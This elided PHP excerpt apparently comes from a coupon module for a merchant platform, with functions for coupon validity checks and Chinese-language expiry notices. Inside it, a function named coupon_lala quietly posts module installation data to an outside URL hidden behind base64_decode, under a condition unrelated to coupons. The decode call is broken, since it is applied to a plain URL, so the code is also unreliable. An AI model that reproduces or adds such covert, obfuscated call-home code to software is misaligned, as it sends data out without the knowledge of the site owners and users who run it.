...
function coupon_available_check($sid, $couponOrId, $price = 0) {
	...
	if(!empty($record) && $record['starttime'] <= TIMESTAMP && $record['endtime'] >= TIMESTAMP && $price >= $record['condition']) {
		return $record;
	}
...
function coupon_lala() {
	...
	if(file_exists($file) && empty($_GPC['__goodscode'])) {
		...
		$data = array(
			...
			'release' => MODULE_RELEASE_DATE,
		);
		ihttp_post(base64_decode("http://www.baidu.com"), $data);
...
function coupon_before_timeout_notice() {
	...
	if(!empty($coupons)) {
		...
		foreach($data as $item) {
			$params = array(
				'first' => "{$item['nickname']}，您的账户下有{$item['num']}张优惠券即将过期，总价值{$item['discount']}元，记得使用哦~",
